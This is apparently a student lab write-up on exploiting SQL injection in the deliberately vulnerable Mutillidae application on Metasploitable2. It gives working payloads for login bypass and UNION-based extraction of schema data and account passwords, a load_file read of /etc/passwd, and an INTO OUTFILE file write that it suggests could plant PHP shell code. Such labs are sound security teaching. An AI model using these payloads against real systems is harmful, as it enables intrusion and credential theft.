# sqlinjection
Exploiting SQL Injection vulnerability

# AIM:
To exploit SQL Injection vulnerability using Multidae web application in Metasploitable2

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode


### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
SQL Injection is a sort of infusion assault that makes it conceivable to execute malicious SQL statements. These statements control a database server behind a web application. Assailants can utilize SQL Injection vulnerabilities to sidestep application safety efforts. They can circumvent authentication and authorization of a page or web application and recover the content of the whole SQL database. Identify IP address using ifconfig in Metasploitable2

![image](https://github.com/Srujana0303/sqlinjection/assets/132996836/4b0921e8-009c-4e57-8359-aae50be5a925)

Use the above ip address to access the apache webserver of Metasploitable2 from kali linux. In Kali Linux use the ip address in a web browser.

![image](https://github.com/Srujana0303/sqlinjection/assets/132996836/f328fddf-ece1-4ae8-b8b0-04bf81fe51be)

Select Multidae from the menu listed as shown above. You will get the page as displayed below:

![image](https://github.com/Srujana0303/sqlinjection/assets/132996836/9e333f79-c72c-4493-a404-a2b7c77245e5)

Click on the menu Login/Register and register for an account

![image](https://github.com/Srujana0303/sqlinjection/assets/132996836/0fcd9a56-db4b-43c3-93b6-b8db248e071b)

Click on the link “Please register here”

![image](https://github.com/Srujana0303/sqlinjection/assets/132996836/e1fecf2a-6f58-40a6-a8bc-270c11d59990)

Click on “Create Account” to display the following page:

![image](https://github.com/Srujana0303/sqlinjection/assets/132996836/f88b6d36-7a4c-434f-bb5b-befedb427e92)

The login structure we will use in our examples is straightforward. It contains two input fields (username and password), which are both vulnerable. The back-end content creates a query to approve the username and secret key given by the client. Here is an outline of the page rationale:

($query = “SELECT * FROM users WHERE username=’$_POST[username]’ AND password=’$_POST[password]’“;). For the username put “ganesh” or “anything” and for the password put (anything’ or ‘1’=’1) or (admin’ or ‘1’=’1) then try to log in, and you’ll be presented with an admin login page.

![image](https://github.com/Srujana0303/sqlinjection/assets/132996836/bbd4c975-6847-476e-96d7-77817df50f5b)

Click “Login”. The logged in page will show as below:

![image](https://github.com/Srujana0303/sqlinjection/assets/132996836/d8e067c9-e278-4fdf-a618-dfe964002ca7)

Bypassing login field

The username field is vulnerable. Put (ganesh’ #) or (ganesh’--) in the username field and hit “Enter” to log in. We use “#” or “--” to comment everything in the query sentence that comes after the username filed telling the database to disregard the password field: (SELECT * FROM users WHERE username=’admin’ # AND password=’ ‘). By using line commenting, the aggressor eliminates a part of the login condition and gains access. This technique will make the “WHERE” clause true only for one user; in this case, it is “ganesh.”

Now after logging out you will see the login page. In the login page give ganesh’ # . You can see the page now enters into the administrator page as before when giving the password.

![image](https://github.com/Srujana0303/sqlinjection/assets/132996836/3fcc0b3d-998f-4b0a-a505-072a99859bc2)

Click the login button and you will see it enter into the administrator page.

![image](https://github.com/Srujana0303/sqlinjection/assets/132996836/b6b56ec3-b096-4990-a8bc-19cf8331fa5e)

## Union-based SQL injection:

UNION-based SQL injection assaults enable the analyzer to extract data from the database effectively. Since the “UNION” operator must be utilized if the two inquiries have precisely the same structure, the attacker must craft a “SELECT” statement like the first inquiry. we will be using the “User Info” page from Mutillidae to perform a Union-Based SQL injection attack. Go to “OWASP Top 10/A1 — Injection/SQLi — Extract-Data/User Info” After logging out, Now choose the menu as shown below

![image](https://github.com/Srujana0303/sqlinjection/assets/132996836/56d764c9-bcbb-464e-9383-70185f14fdf0)
![image](https://github.com/Srujana0303/sqlinjection/assets/132996836/e668842d-92ff-4a64-828b-75f7782afb5e)
![image](https://github.com/Srujana0303/sqlinjection/assets/132996836/0178bbb7-5e05-413b-89ff-211235246ec3)
![image](https://github.com/Srujana0303/sqlinjection/assets/132996836/5008b1ad-5ade-424f-aa12-ac1c9da4f19b)

From this point, all our attack vectors will be performed in the URL section of the page using the Union-Based technique.There are two different ways to discover how many columns are selected by the original query. The first is to infuse an “ORDER BY” statement indicating a column number. Given the column number specified is higher than the number of columns in the “SELECT” statement, an error will be returned.

![image](https://github.com/Srujana0303/sqlinjection/assets/132996836/95e15cba-1228-447e-9d51-bd577f761d90)

Since we do not know the number of columns, we start at 1. To find the exact amount of columns, the number is incremented until an error related to the “ORDER BY” clause is returned. In this example, we incremented it to 6 and received an error message, so it means that the number of columns is lower than 6.

The browser url of this info page need to be modified with the url as below: http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27order%20by%206%23&password=&user-info-php-submit-button=View+Account+Details

![image](https://github.com/Srujana0303/sqlinjection/assets/132996836/fea23ee4-20af-49c1-ba3d-ea59298891cd)

After adding the order by 6 into the existing url , the following error statement will be obtained:

![image](https://github.com/Srujana0303/sqlinjection/assets/132996836/78675885-0ef1-4b1a-8ba6-6161caecb9ce)

When we ordered by 5, it worked and displayed some information. It means there are five columns that we can work with. Following screenshot shows that the url modified to have statement added with ordered by 5 replacing 6.

![image](https://github.com/Srujana0303/sqlinjection/assets/132996836/281b3b1f-e1fb-40b0-98db-f4c3a95f6f93)

As it is having 5 columns the query worked fine and it provides the correct result

![image](https://github.com/Srujana0303/sqlinjection/assets/132996836/52ca962c-b204-4f50-9134-3184a40031f2)

Instead of using the "order by" option, let’s use the "union select" option and provide all five columns. Ex: (union select 1,2,3,4,5)

![image](https://github.com/Srujana0303/sqlinjection/assets/132996836/54108740-d46b-441e-b3fe-2e9a50322a9b)

As given in the screenshot below columns 2,3,4 are usable in which we can substitute any sql commands to extract necessary information.

![image](https://github.com/Srujana0303/sqlinjection/assets/132996836/472208bd-9a7d-4656-83b3-a7c8ee4237cc)

Now we will substitute some few commands like database(), user(), version() to obtain the information regarding the database name, username and version of the database.

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,database(),user(),version(),5%23&password=&user-info-php-submit-button=View+Account+Details

![image](https://github.com/Srujana0303/sqlinjection/assets/132996836/ea55ad59-661d-4335-8685-93bcbb1aa08c)

The url when executed, we obtain the necessary information about the database name owasp10, username as root@localhost and version as 5.0.51a-3ubuntu5. In MySQL, the table “information_schema.tables” contains all the metadata identified with table items. Below is listed the most useful information on this table.

Replace the query in the url with the following one: union select 1,table_name,null,null,5 from information_schema.tables where table_schema = ‘owasp10’

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,table_name,null,null,5%20from%20information_schema.tables%20where%20table_schema=%27owasp10%27%23&password=&user-info-php-submit-button=View+Account+Details

![image](https://github.com/Srujana0303/sqlinjection/assets/132996836/c1f8ba7e-e1bf-40dd-80a0-c7ea10b01d16)

The url once executed will retrieve table names from the “owasp 10” database. ##Extracting sensitive data such as passwords

When the attacker knows table names, he needs to discover what the column names are to extract data.

In MySQL, the table “information_schema.columns” gives data about columns in tables. One of the most useful columns to extract is called “column_name.”

Ex: (union select 1,colunm_name,null,null,5 from information_schema.columns where table_name = ‘accounts’).

Here we are trying to extract column names from the “accounts” table.

![image](https://github.com/Srujana0303/sqlinjection/assets/132996836/f682df48-ddc2-4e37-8166-efe159b5ca18)

The column names of the accounts is displayed below for the following url:

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,column_name,null,null,5%20from%20information_schema.columns%20where%20table_name=%27accounts%27%23&password=&user-info-php-submit-button=View+Account+Details

![image](https://github.com/Srujana0303/sqlinjection/assets/132996836/1aff9cc4-3190-4508-a4ae-de3024ca17cb)

Once we discovered all available column names, we can extract information from them by just adding those column names in our query sentence.

Ex: (union select 1,username,password,is_admin,5 from accounts).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,username,password,is_admin,5%20from%20accounts%23&password=&user-info-php-submit-button=View+Account+Details

![image](https://github.com/Srujana0303/sqlinjection/assets/132996836/cb5bf31d-7e0d-4d69-9c0e-94b4b70f7aa8)

## Reading and writing files on the web-server:

We can use the “LOAD_FILE()” operator to peruse the contents of any file contained within the web-server. We will typically check for the “/etc/password” file to see if we get lucky and scoop usernames and passwords to possible use in brute force attacks later.

Ex: (union select null,load_file(‘/etc/passwd’),null,null,null).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%20null,load_file(%27/etc/passwd%27),null,null,null%23&password=&user-info-php-submit-button=View+Account+Details

![image](https://github.com/Srujana0303/sqlinjection/assets/132996836/54c99ef6-de88-44d5-a7ed-c7a7d645d27d)

the “INTO_OUTFILE()” operator for all that they offer and attempt to root the objective server by transferring a shell-code through SQL infusion. we will write a “Hello World!” sentence and output it in the “/tmp/” directory as a “hello.txt” file. This “Hello World!” sentence can be substituted with any PHP shell-code that you want to execute in the target server. Ex: (union select null,’Hello World!’,null,null,null into outfile ‘/tmp/hello.txt’).

## RESULT:
The SQL Injection vulnerability is successfully exploited using the Multidae web application in Metasploitable2.
